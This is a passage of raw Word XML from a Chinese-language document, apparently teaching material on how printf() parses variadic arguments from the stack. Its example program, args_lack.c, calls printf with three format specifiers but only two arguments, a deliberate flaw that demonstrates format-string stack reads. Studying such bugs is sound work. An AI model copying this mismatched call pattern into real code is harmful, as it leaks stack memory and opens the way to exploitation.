          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55CF2613" wp14:editId="06F49D38">
            <wp:extent cx="4998720" cy="1188720"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1" name="图片 1" descr="基本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基本例子"/>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998720" cy="1188720"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DFB513" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>图</w:t>
      </w:r>
      <w:r>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xml:space="preserve">SEQ </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText>图</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* ARABIC</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proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数参数解析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25327039"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在图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的例子中，使用了含</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个可变参数的</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函数。它的格式化字符串中有三个以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>引导的元素，这些元素被称为格式规定符。当调用</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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>函数时，它会将所输入的所有参数压入</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中。在工作时，</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函数扫描格式化字符串，打印出每个遇到的字符，直到遇到一个格式规定符。此时，</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会到</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>中获取相应的参数，对其解析并输出。在这个解析的过程中，</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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>使用到了指针</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指向所要解析的参数，在解析完成后，根据所解析参数的类型使指针移动并指向下一个可变参数的位置</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>型则移动</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>字节，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ouble</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>型则移动</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>字节</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B07F7C7" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7140198C" wp14:editId="43211681">
            <wp:extent cx="4160520" cy="31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63863" cy="3166260"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB94232" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>图</w:t>
      </w:r>
      <w:r>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xml:space="preserve">SEQ </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText>图</w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> \* ARABIC</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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数的工作过程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2D34C8"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源代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4EB479" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="567"/>
        <w:rPr>
          <w:ins w:id="7" w:author="zhao ruizhi" w:date="2023-05-07T17:34:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="67693C6F" wp14:editId="4B406BE7">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1504315</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>346075</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="1396365"/>
                <wp:effectExtent l="4445" t="4445" r="9525" b="8890"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="19" name="文本框 19"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="1396365"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="7DEA8EC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2A736E29"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2955F20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6133269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id=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>100</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, age=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>25</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="025D9C6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*name=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>"Bob Smith"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5C469BF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"ID: %d, Name: %s, Age: %d\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="A31515"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>n"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>,id</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, name);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1BDA76E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2710456D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="67693C6F" id="文本框 19" o:spid="_x0000_s1027" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:118.45pt;margin-top:27.25pt;width:392.9pt;height:109.95pt;z-index:-2516541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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="7DEA8EC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2A736E29"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2955F20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6133269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id=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>100</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, age=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>25</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="025D9C6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*name=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>"Bob Smith"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5C469BF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"ID: %d, Name: %s, Age: %d\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>,id</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, name);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1BDA76E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2710456D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rgs_lack.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="36442158" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="567"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="8" w:author="zhao ruizhi" w:date="2023-05-07T17:34:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0178673F" wp14:editId="031D85B3">
              <wp:extent cx="5274310" cy="1772920"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="1713315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15430" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId8"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="1772920"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6EBFF007"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编译与运行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54682C2F"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编译</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rgs_lack.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B73F9CA" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251663360" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1E9EE525" wp14:editId="50C9757F">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1454150</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>13970</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="501650"/>
                <wp:effectExtent l="4445" t="4445" r="9525" b="14605"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="35" name="文本框 35"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="501650"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="26FD7391" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="102"/>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w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
